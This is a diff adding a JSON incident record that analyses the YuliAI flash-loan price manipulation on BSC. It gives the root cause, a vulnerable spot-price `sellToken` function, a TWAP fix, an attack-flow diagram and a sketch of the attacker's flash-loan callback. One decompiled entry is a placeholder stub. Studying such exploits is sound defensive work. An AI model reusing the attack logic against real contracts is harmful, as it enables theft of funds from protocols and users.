@@ -1,0 +1,28 @@
+{
+ "id": "2025__2025-08-06_YuliAI_FlashLoan-PriceManipulation",
+ "source_file": "2025/2025-08-06_YuliAI_FlashLoan-PriceManipulation.md",
+ "title": "YuliAI — Flash Loan-Based Price Manipulation Analysis",
+ "date": "2025-08-06",
+ "protocol": "YuliAI",
+ "chain": "BSC",
+ "loss_raw": "~78,000 USD",
+ "loss_usd": null,
+ "root_cause": "The `sellToken` function relies on a manipulable PancakeSwap AMM spot price to determine the exchange rate",
+ "attack_tx": "0xeab946cf...",
+ "vulnerable_contract": "0x8262325Bf1d8c3bE83EB99f5a74b8458Ebb96282",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: uses spot price directly, exposed to flash loan manipulation\nfunction sellToken(uint256 tokenAmount) payable external {\n    // Calculates USDT payout based on current AMM spot price\n    // → Manipulating pool price via flash loan allows receiving more USDT than actual value\n    uint256 usdtOut = getSpotPrice() * tokenAmount;\n    IERC20(USDT).transfer(msg.sender, usdtOut);\n}\n\n//",
+  "// File: YuliAI_decompiled.sol\ncontract YuliAI {\n    function sellToken(uint256 a) external view returns (address) {  // ❌ Vulnerability\n        // TODO: decompilation logic not implemented\n    }"
+ ],
+ "code_after": [
+  "✅ Recommended fix: use TWAP or an external oracle\nfunction sellToken(uint256 tokenAmount) payable external {\n    uint256 usdtOut = getTWAPPrice() * tokenAmount; // Use manipulation-resistant price\n    IERC20(USDT).transfer(msg.sender, usdtOut);\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ Request Moolah flash loan (borrow large amount of USDT)\n  │\n  ├─[2]─▶ Buy large amount of YULIAI on PancakeSwap pool\n  │         └─ YULIAI price spikes (spot price manipulated)\n  │\n  ├─[3]─▶ Call victim.sellToken(YULIAI)\n  │         └─ Receive excess USDT based on manipulated high price\n  │\n  ├─[4]─▶ Sell YULIAI on PancakeSwap (price recovers)\n  │\n  └─[5]─▶ Repay flash loan + retain profit\n              └─ ~78,000 USD profit",
+  "// Attack contract core logic\nfunction onMoolahFlashLoan(uint256 assets, bytes calldata userData) public {\n    // [1] Use USDT received from flash loan to buy large amount of YULIAI\n    // → Drive up PancakeSwap spot price\n    swap(YULIAI, address(USDT_ADDR), assets);\n\n    // [2] Call sellToken at manipulated price\n    // → Victim contract pays out USDT based on the inflated spot price\n    IVictim(VICTIM).sellToken{value: msg.value}(tokenBalance);\n\n    // [3] Swap received YULIAI back to USDT (price normalizes)\n    swap(address(USDT_ADDR), YULIAI, yuliaiBalance);\n\n    // [4] Repay flash loan principal + fee\n    IERC20(USDT_ADDR).transfer(msg.sender, assets + fee);\n}"
+ ]
+}
